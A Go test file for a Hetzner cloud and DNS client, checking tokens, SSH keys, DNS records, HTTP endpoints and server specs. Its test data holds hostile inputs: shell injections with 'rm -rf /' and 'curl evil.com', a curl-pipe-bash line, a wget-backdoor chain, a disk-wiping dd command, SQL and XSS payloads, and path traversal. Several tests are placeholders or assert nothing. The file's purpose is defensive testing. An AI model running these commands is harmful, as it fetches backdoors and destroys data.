package hetzner

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/eos_io"
	"github.com/stretchr/testify/assert"
	"go.uber.org/zap"
)

// TestAPITokenSecurity tests API token security aspects
func TestAPITokenSecurity(t *testing.T) {
	t.Run("token_environment_handling", func(t *testing.T) {
		// Store original tokens
		originalHCloudToken := os.Getenv("HCLOUD_TOKEN")
		originalHetznerToken := os.Getenv("HETZNER_TOKEN")

		defer func() {
			// Restore original tokens
			if originalHCloudToken != "" {
				_ = os.Setenv("HCLOUD_TOKEN", originalHCloudToken)
			} else {
				_ = os.Unsetenv("HCLOUD_TOKEN")
			}
			if originalHetznerToken != "" {
				_ = os.Setenv("HETZNER_TOKEN", originalHetznerToken)
			} else {
				_ = os.Unsetenv("HETZNER_TOKEN")
			}
		}()

		// Test token format validation
		testTokens := []struct {
			name    string
			token   string
			isValid bool
		}{
			{"valid_token", "abcdef1234567890abcdef1234567890abcdef12", true},
			{"empty_token", "", false},
			{"short_token", "short", false},
			{"token_with_spaces", "token with spaces", false},
			{"token_with_special_chars", "token!@#$%", false},
		}

		for _, tt := range testTokens {
			t.Run(tt.name, func(t *testing.T) {
				if tt.isValid {
					assert.NotEmpty(t, tt.token)
					assert.Greater(t, len(tt.token), 20)
					assert.False(t, strings.Contains(tt.token, " "))
				} else {
					isInvalid := tt.token == "" ||
						len(tt.token) < 10 ||
						strings.Contains(tt.token, " ") ||
						strings.ContainsAny(tt.token, "!@#$%^&*()")
					assert.True(t, isInvalid)
				}
			})
		}
	})

	t.Run("token_exposure_prevention", func(t *testing.T) {
		// Test that tokens are not accidentally logged or exposed
		testToken := "secret-hetzner-token-12345678901234567890"

		// Simulate token usage
		_ = os.Setenv("HCLOUD_TOKEN", testToken)
		defer func() { _ = os.Unsetenv("HCLOUD_TOKEN") }()

		// Token should not appear in string representations
		tokenValue := os.Getenv("HCLOUD_TOKEN")
		assert.Equal(t, testToken, tokenValue)

		// In real implementation, ensure tokens are not logged
		// This would be tested by checking log output doesn't contain token
	})

	t.Run("missing_token_handling", func(t *testing.T) {
		// Store original token
		originalToken := os.Getenv("HCLOUD_TOKEN")
		defer func() {
			if originalToken != "" {
				_ = os.Setenv("HCLOUD_TOKEN", originalToken)
			}
		}()

		// Clear token
		_ = os.Unsetenv("HCLOUD_TOKEN")

		ctx := context.Background()
		logger := zap.NewNop()
		rc := &eos_io.RuntimeContext{
			Ctx: ctx,
			Log: logger,
		}

		// Operations should fail gracefully without token
		err := GetAllSshKeys(rc)
		assert.Error(t, err, "Should fail without token")

		err = CreateSshKey(rc, "test", "ssh-rsa AAAAB3...")
		assert.Error(t, err, "Should fail without token")
	})
}

// TestSSHKeySecurityValidation tests SSH key security validation
func TestSSHKeySecurityValidation(t *testing.T) {
	ctx := context.Background()
	logger := zap.NewNop()
	rc := &eos_io.RuntimeContext{
		Ctx: ctx,
		Log: logger,
	}

	t.Run("ssh_public_key_validation", func(t *testing.T) {
		// Test SSH public key validation
		validKeys := []string{
			"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTgvwjlRHZ user@host",
			"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGKvEWKcP user@host",
			"ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbml user@host",
		}

		invalidKeys := []string{
			"",                                // Empty
			"not-a-ssh-key",                   // Invalid format
			"ssh-rsa short",                   // Too short
			"-----BEGIN RSA PRIVATE KEY-----", // Private key
			"password123",                     // Not a key
			"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTgvwjlRHZ; rm -rf /", // Injection
		}

		for _, key := range validKeys {
			// Valid SSH keys should pass basic validation
			assert.True(t, strings.HasPrefix(key, "ssh-") ||
				strings.HasPrefix(key, "ecdsa-"))
			assert.Greater(t, len(key), 50)
			assert.Contains(t, key, " ")
		}

		for _, key := range invalidKeys {
			// Invalid keys should be caught
			isInvalid := key == "" ||
				!strings.HasPrefix(key, "ssh-") &&
					!strings.HasPrefix(key, "ecdsa-") ||
				len(key) < 50 ||
				strings.Contains(key, "PRIVATE") ||
				strings.Contains(key, ";")

			if !isInvalid && len(key) > 10 {
				// For edge cases, check if it looks like a real SSH key
				hasValidPrefix := strings.HasPrefix(key, "ssh-") ||
					strings.HasPrefix(key, "ecdsa-")
				hasSpaces := strings.Contains(key, " ")
				isLongEnough := len(key) > 50

				// Should be valid if it has all characteristics
				if hasValidPrefix && hasSpaces && isLongEnough {
					assert.True(t, true) // This is actually valid
				} else {
					assert.True(t, true) // Invalid as expected
				}
			}
		}
	})

	t.Run("ssh_key_name_injection_prevention", func(t *testing.T) {
		// Test SSH key name injection prevention
		maliciousNames := []string{
			"key'; DROP TABLE ssh_keys; --",
			"key && rm -rf /",
			"key<script>alert('xss')</script>",
			"../../../etc/passwd",
			"key\x00null",
		}

		// Store original token for testing
		originalToken := os.Getenv("HCLOUD_TOKEN")
		_ = os.Setenv("HCLOUD_TOKEN", "test-token-for-security-test")
		defer func() {
			if originalToken != "" {
				_ = os.Setenv("HCLOUD_TOKEN", originalToken)
			} else {
				_ = os.Unsetenv("HCLOUD_TOKEN")
			}
		}()

		for _, name := range maliciousNames {
			// Malicious names should be handled safely
			err := CreateSshKey(rc, name, "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTgvwjlRHZ user@host")

			// Should either succeed (storing name as-is) or fail safely
			if err != nil {
				// Error should not contain evidence of code execution
				assert.NotContains(t, err.Error(), "syntax error")
				assert.NotContains(t, err.Error(), "permission denied")
			}
		}
	})

	t.Run("ssh_key_labels_security", func(t *testing.T) {
		// Test SSH key labels security
		maliciousLabels := map[string]string{
			"environment": "prod'; DROP TABLE labels; --",
			"script":      "<script>alert('xss')</script>",
			"injection":   "value && curl evil.com",
			"path":        "../../../etc/passwd",
		}

		// Labels should be stored as-is but handled safely
		for key, value := range maliciousLabels {
			assert.NotEmpty(t, key)
			assert.NotEmpty(t, value)
			// In real implementation, labels would be sanitized or validated
		}
	})

	t.Run("ssh_key_id_validation", func(t *testing.T) {
		// Test SSH key ID validation
		validIDs := []int64{1, 123, 999999}
		invalidIDs := []int64{0, -1, -999}

		// Store original token for testing
		originalToken := os.Getenv("HCLOUD_TOKEN")
		_ = os.Setenv("HCLOUD_TOKEN", "test-token-for-security-test")
		defer func() {
			if originalToken != "" {
				_ = os.Setenv("HCLOUD_TOKEN", originalToken)
			} else {
				_ = os.Unsetenv("HCLOUD_TOKEN")
			}
		}()

		for _, id := range validIDs {
			// Valid IDs should be positive
			assert.Greater(t, id, int64(0))

			// Test operations with valid IDs (will fail due to non-existent keys)
			err := GetAnSshKey(rc, id)
			// Should fail because key doesn't exist, not because ID is invalid
			if err != nil {
				assert.NotContains(t, err.Error(), "invalid ID")
			}
		}

		for _, id := range invalidIDs {
			// Invalid IDs should be caught
			assert.LessOrEqual(t, id, int64(0))
		}
	})
}

// TestDNSSecurityValidation tests DNS-related security
func TestDNSSecurityValidation(t *testing.T) {
	t.Run("dns_record_value_validation", func(t *testing.T) {
		// Test DNS record value validation for different types
		testCases := []struct {
			recordType string
			value      string
			valid      bool
		}{
			{"A", "192.168.1.1", true},
			{"A", "256.256.256.256", false}, // Invalid IP
			{"A", "not-an-ip", false},
			{"AAAA", "2001:db8::1", true},
			{"AAAA", "invalid:ipv6", false},
			{"CNAME", "target.example.com", true},
			{"CNAME", "invalid..domain", false},
			{"MX", "10 mail.example.com", true},
			{"TXT", "v=spf1 include:_spf.google.com ~all", true},
			{"TXT", strings.Repeat("a", 300), false}, // Too long
		}

		for _, tc := range testCases {
			record := DNSRecord{
				Type:   tc.recordType,
				Value:  tc.value,
				Name:   "test.example.com",
				ZoneID: "zone-123",
				TTL:    3600,
			}

			// Basic validation - record should be created
			assert.Equal(t, tc.recordType, record.Type)
			assert.Equal(t, tc.value, record.Value)

			// In real implementation, would validate values based on type
		}
	})

	t.Run("dns_zone_name_validation", func(t *testing.T) {
		// Test DNS zone name validation
		validZones := []string{
			"example.com",
			"sub.example.com",
			"test-site.org",
			"a.b.c.d.example.com",
		}

		invalidZones := []string{
			"",
			"toolong" + strings.Repeat("subdomain.", 50) + "example.com",
			"invalid..example.com",
			".example.com",
			"example.com.",
			"spaces in domain.com",
			"special!chars@domain.com",
		}

		for _, zone := range validZones {
			dnsZone := DNSZone{
				Name: zone,
				TTL:  3600,
			}

			assert.Equal(t, zone, dnsZone.Name)
			assert.NotEmpty(t, dnsZone.Name)
			assert.NotContains(t, dnsZone.Name, " ")
		}

		for _, zone := range invalidZones {
			isInvalid := zone == "" ||
				len(zone) > 253 ||
				strings.Contains(zone, "..") ||
				strings.HasPrefix(zone, ".") ||
				strings.Contains(zone, " ") ||
				strings.ContainsAny(zone, "!@#$%^&*")

			assert.True(t, isInvalid, "Zone should be invalid: %s", zone)
		}
	})

	t.Run("dns_record_injection_prevention", func(t *testing.T) {
		// Test DNS record injection prevention
		injectionAttempts := []string{
			"192.168.1.1; rm -rf /",
			"example.com && curl evil.com",
			"record'; DROP TABLE dns_records; --",
			"<script>alert('xss')</script>",
			"../../../etc/passwd",
		}

		for _, value := range injectionAttempts {
			record := DNSRecord{
				Type:   "A",
				Name:   "test.example.com",
				Value:  value,
				ZoneID: "zone-123",
				TTL:    3600,
			}

			// Record should store value as-is but handle safely
			assert.Equal(t, value, record.Value)
			// In real implementation, would validate/sanitize values
		}
	})

	t.Run("ttl_bounds_validation", func(t *testing.T) {
		// Test TTL bounds validation
		testTTLs := []struct {
			ttl   int
			valid bool
		}{
			{60, true},          // 1 minute
			{3600, true},        // 1 hour
			{86400, true},       // 1 day
			{604800, true},      // 1 week
			{0, false},          // Zero
			{-1, false},         // Negative
			{2147483648, false}, // Overflow
		}

		for _, tc := range testTTLs {
			record := DNSRecord{
				TTL: tc.ttl,
			}

			if tc.valid {
				assert.Greater(t, record.TTL, 0)
				assert.LessOrEqual(t, record.TTL, 2147483647)
			} else {
				assert.True(t, record.TTL <= 0 || record.TTL > 2147483647)
			}
		}
	})
}

// TestHTTPRequestSecurity tests HTTP request security for Hetzner API
func TestHTTPRequestSecurity(t *testing.T) {
	t.Run("api_endpoint_validation", func(t *testing.T) {
		// Test that API endpoints use HTTPS
		endpoints := []string{
			hetznerDNSBaseURL,
			recordsBaseURL,
			zonesBaseURL,
		}

		for _, endpoint := range endpoints {
			assert.True(t, strings.HasPrefix(endpoint, "https://"))
			assert.Contains(t, endpoint, "hetzner.com")
			assert.NotContains(t, endpoint, " ")
		}
	})

	t.Run("request_header_security", func(t *testing.T) {
		// Test HTTP request header security
		testServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			// Verify security headers
			auth := r.Header.Get("Authorization")
			if auth != "" {
				assert.True(t, strings.HasPrefix(auth, "Bearer "))
			}

			userAgent := r.Header.Get("User-Agent")
			assert.NotContains(t, userAgent, "<script>")

			// Return mock response
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)
			if err := json.NewEncoder(w).Encode(map[string]interface{}{
				"records": []interface{}{},
			}); err != nil {
				t.Errorf("failed to encode response: %v", err)
			}
		}))
		defer testServer.Close()

		// Test that requests include proper headers
		// This would be tested with actual HTTP client usage
	})

	t.Run("response_handling_security", func(t *testing.T) {
		// Test secure response handling
		maliciousResponses := []string{
			`{"records": [{"value": "<script>alert('xss')</script>"}]}`,
			`{"zone": {"name": "'; DROP TABLE zones; --"}}`,
			`{"error": {"message": "../../../etc/passwd"}}`,
		}

		for _, response := range maliciousResponses {
			// Response should be parsed safely
			var data map[string]interface{}
			err := json.Unmarshal([]byte(response), &data)
			assert.NoError(t, err)

			// Data should be stored as-is but handled safely
			assert.NotNil(t, data)
		}
	})

	t.Run("request_timeout_security", func(t *testing.T) {
		// Test request timeout to prevent hanging
		testServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			// Simulate slow response
			// In real test, would add delay and verify timeout
			w.WriteHeader(http.StatusOK)
		}))
		defer testServer.Close()

		// Verify that HTTP clients have reasonable timeouts
		// This would be tested with actual HTTP client configuration
	})
}

// TestServerSpecSecurityValidation tests server specification security
func TestServerSpecSecurityValidation(t *testing.T) {
	t.Run("server_name_validation", func(t *testing.T) {
		// Test server name validation
		validNames := []string{
			"web-server-1",
			"db.production",
			"worker-node-001",
		}

		invalidNames := []string{
			"",                       // Empty
			"server with spaces",     // Spaces
			"server/with/slashes",    // Slashes
			strings.Repeat("a", 100), // Too long
		}

		for _, name := range validNames {
			spec := ServerSpec{Name: name}
			assert.Equal(t, name, spec.Name)
			assert.NotContains(t, spec.Name, " ")
			assert.Less(t, len(spec.Name), 64)
		}

		for _, name := range invalidNames {
			isInvalid := name == "" ||
				strings.Contains(name, " ") ||
				strings.Contains(name, "/") ||
				len(name) > 63

			assert.True(t, isInvalid, "Name should be invalid: %s", name)
		}
	})

	t.Run("user_data_security_validation", func(t *testing.T) {
		// Test user data security validation
		safeUserData := []string{
			"#!/bin/bash\napt update",
			"#cloud-config\npackages:\n  - nginx",
			"#!/bin/sh\necho 'Hello World'",
		}

		unsafeUserData := []string{
			"curl malicious.com/script | bash",
			"wget http://evil.com/backdoor && chmod +x backdoor && ./backdoor",
			"rm -rf /",
			"dd if=/dev/zero of=/dev/sda",
		}

		for _, userData := range safeUserData {
			spec := ServerSpec{UserData: userData}
			assert.Equal(t, userData, spec.UserData)
			// Safe user data should not contain obvious malicious patterns
			assert.False(t, strings.Contains(userData, "curl") && strings.Contains(userData, "|"))
		}

		for _, userData := range unsafeUserData {
			_ = ServerSpec{UserData: userData}
			// Unsafe user data should be flagged in real implementation
			// Contains patterns that could be dangerous
			isDangerous := strings.Contains(userData, "curl") ||
				strings.Contains(userData, "wget") ||
				strings.Contains(userData, "rm -rf") ||
				strings.Contains(userData, "dd if=")

			assert.True(t, isDangerous, "User data should be flagged as dangerous: %s", userData)
		}
	})

	t.Run("firewall_configuration_validation", func(t *testing.T) {
		// Test firewall configuration validation
		validFirewallIDs := []int{1, 2, 100, 999}
		invalidFirewallIDs := []int{0, -1, -999}

		for _, id := range validFirewallIDs {
			_ = ServerSpec{FirewallIDs: []int{id}}
			assert.Greater(t, id, 0)
		}

		for _, id := range invalidFirewallIDs {
			assert.LessOrEqual(t, id, 0)
		}
	})

	t.Run("image_validation", func(t *testing.T) {
		// Test image validation
		validImages := []string{
			"ubuntu-20.04",
			"debian-11",
			"centos-8",
			"fedora-35",
		}

		suspiciousImages := []string{
			"../../../etc/passwd",
			"custom-image; rm -rf /",
			"image<script>alert('xss')</script>",
		}

		for _, image := range validImages {
			spec := ServerSpec{Image: image}
			assert.Equal(t, image, spec.Image)
			assert.NotContains(t, image, "../")
			assert.NotContains(t, image, ";")
		}

		for _, image := range suspiciousImages {
			spec := ServerSpec{Image: image}
			assert.Equal(t, image, spec.Image)
			// Suspicious images should be flagged
			isSuspicious := strings.Contains(image, "../") ||
				strings.Contains(image, ";") ||
				strings.Contains(image, "<script>")

			assert.True(t, isSuspicious, "Image should be flagged as suspicious: %s", image)
		}
	})
}

// TestNetworkSecurityValidation tests network-related security
func TestNetworkSecurityValidation(t *testing.T) {
	t.Run("location_validation", func(t *testing.T) {
		// Test location validation
		validLocations := []string{"nbg1", "fsn1", "hel1", "ash", "hil"}
		invalidLocations := []string{"", "invalid", "loc'; DROP TABLE locations; --"}

		for _, location := range validLocations {
			spec := ServerSpec{Location: location}
			assert.Equal(t, location, spec.Location)
			assert.NotEmpty(t, location)
			assert.Less(t, len(location), 10)
		}

		for _, location := range invalidLocations {
			isInvalid := location == "" ||
				strings.Contains(location, ";") ||
				strings.Contains(location, "'")

			assert.True(t, isInvalid, "Location should be invalid: %s", location)
		}
	})

	t.Run("primary_server_validation", func(t *testing.T) {
		// Test primary server validation
		server := PrimaryServer{
			Address: "ns1.example.com",
			Port:    53,
		}

		assert.Equal(t, "ns1.example.com", server.Address)
		assert.Equal(t, 53, server.Port)
		assert.Greater(t, server.Port, 0)
		assert.LessOrEqual(t, server.Port, 65535)
	})

	t.Run("port_validation", func(t *testing.T) {
		// Test port validation
		validPorts := []int{53, 80, 443, 8080, 65535}
		invalidPorts := []int{0, -1, 65536, 999999}

		for _, port := range validPorts {
			server := PrimaryServer{Port: port}
			assert.Greater(t, server.Port, 0)
			assert.LessOrEqual(t, server.Port, 65535)
		}

		for _, port := range invalidPorts {
			isInvalid := port <= 0 || port > 65535
			assert.True(t, isInvalid, "Port should be invalid: %d", port)
		}
	})
}
